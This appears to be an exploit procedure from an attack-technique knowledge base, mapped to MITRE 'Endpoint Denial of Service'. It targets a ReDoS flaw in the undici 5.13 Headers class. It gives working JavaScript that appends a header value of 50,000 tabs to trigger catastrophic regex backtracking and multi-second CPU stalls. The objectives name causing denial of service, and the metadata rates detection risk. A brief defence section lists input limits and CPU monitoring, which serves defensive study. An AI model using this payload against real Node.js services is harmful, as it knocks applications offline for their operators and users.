---
tags:
  - redos
  - exploit
  - headers
type: procedure
tools:
  - '[[tools/Node.js]]'
  - '[[tools/undici]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/basic-redos-exploit-js]]'
platforms:
  - Node.js
  - JavaScript
techniques:
  - '[[Endpoint Denial of Service]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 118327b2-2d72-46a6-8f0f-95d3d964fd30
created_at: '2025-12-14T17:26:36.596Z'
updated_at: '2025-12-14T17:26:36.596Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Trigger-ReDoS-with-Malicious-Header

## Summary

This procedure exploits the ReDoS vulnerability by creating a Headers instance from undici and appending or setting a malicious string with repeated tabs, causing catastrophic backtracking in the headerValueNormalize() regex and resulting in CPU-intensive delays.

## Description

The vulnerability occurs in lib/fetch/headers.js where headerValueNormalize() uses a regex prone to backtracking on inputs like 'a\t{50000}\ta'. This step demonstrates the core exploit, applicable to Node.js apps processing untrusted HTTP headers (e.g., via fetch). Expected outcome: Delays of 2-3 seconds, potentially DoS-ing the application.

## Requirements

1. Vulnerable undici@5.13 installed
2. Node.js runtime
3. Script file (e.g., exploit.js) to execute the code

## Defense

Defensive measures and detection strategies:

- Input validation: Sanitize header values to limit length and remove excessive whitespace
- Use regex libraries with timeout features or switch to safer normalization (e.g., manual trimming)
- Monitor CPU spikes during header processing with tools like Node.js clinic.js

## Objectives

1. Invoke the vulnerable regex to trigger backtracking
2. Cause measurable denial of service via CPU exhaustion
3. Validate exploit in a controlled environment

## Instructions

### Step 1: Require and Instantiate Headers

**Context**: Load undici and create a new Headers object.

**Command** (JavaScript setup):
```javascript
const { Headers } = require("undici");
const headers = new Headers();
```

> Prepares the vulnerable class. Expected output: No output; object ready.

### Step 2: Prepare Attack String and Trigger

**Context**: Construct the malicious input and call append() to normalize it, triggering ReDoS.

**Command** ([[commands/basic-redos-exploit-js]]):
```javascript
const attack = "a" + "\t".repeat(50_000) + "\ta";
const start = performance.now();
headers.append("foo", attack);
console.log(`${performance.now() - start}ms`);
```

> Executes the exploit. Expected output: Log like '2932ms', indicating delay.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/basic-redos-exploit-js]]

## Tools Used

- [[tools/Node.js]]
- [[tools/undici]]

## Tags

- redos
- exploit
